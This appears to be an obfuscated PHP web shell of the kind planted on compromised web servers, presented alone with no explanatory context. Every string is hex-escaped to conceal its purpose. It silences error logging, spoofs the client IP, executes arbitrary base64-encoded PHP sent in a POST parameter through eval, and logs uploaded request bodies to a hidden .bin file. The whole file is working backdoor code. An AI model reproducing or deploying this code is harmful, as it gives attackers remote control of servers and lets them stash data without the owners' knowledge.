<?php @error_reporting(0); @ini_set("\x64\x69s\x70\x6c\x61\x79\x5f\x65r\x72\x6fr\x73",0); @ini_set("\x6co\x67\x5f\x65\x72\x72\x6fr\x73",0); @ini_set("\x65r\x72o\x72_lo\x67",0); @ini_set("m\x65\x6d\x6fry_li\x6d\x69\x74", "1\x32\x38M"); @ini_set("ma\x78\x5fe\x78e\x63u\x74\x69\x6fn_\x74\x69\x6de",30); @set_time_limit(30); if (isset($_SERVER["\x48T\x54P\x5f\x58_\x52\x45\x41\x4c_\x49\x50"])) $_SERVER["R\x45\x4d\x4f\x54\x45_ADD\x52"] = $_SERVER["\x48T\x54P\x5f\x58_\x52\x45\x41\x4c_\x49\x50"]; if (isset($_POST["cod\x65"])) { eval(base64_decode($_POST["cod\x65"])); } elseif (isset($_SERVER["\x48\x54\x54P\x5fC\x4f\x4e\x54\x45\x4e\x54\x5fEN\x43\x4f\x44I\x4e\x47"]) && $_SERVER["\x48\x54\x54P\x5fC\x4f\x4e\x54\x45\x4e\x54\x5fEN\x43\x4f\x44I\x4e\x47"] == "\x62\x69nar\x79") { $input = file_get_contents("\x70\x68\x70\x3a\x2f/i\x6e\x70u\x74"); if (strlen($input) > 0) print "\x53TA\x54U\x53\x2dI\x4d\x50O\x52\x54-O\x4b"; if (strlen($input) > 10) { $fp = @fopen(str_replace(".p\x68p","\x2eb\x69n",basename($_SERVER["\x53\x43R\x49P\x54_\x46I\x4c\x45N\x41\x4dE"])), "a"); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER["R\x45\x4d\x4f\x54\x45_ADD\x52"]."\t".base64_encode($input)."\r\n"); @flock($fp, LOCK_UN); @fclose($fp); } } elseif (strpos($_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5fU\x52\x49"], "\x2esh\x74m\x6c") !== false) { print $_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5fU\x52\x49"]; } exit; ?>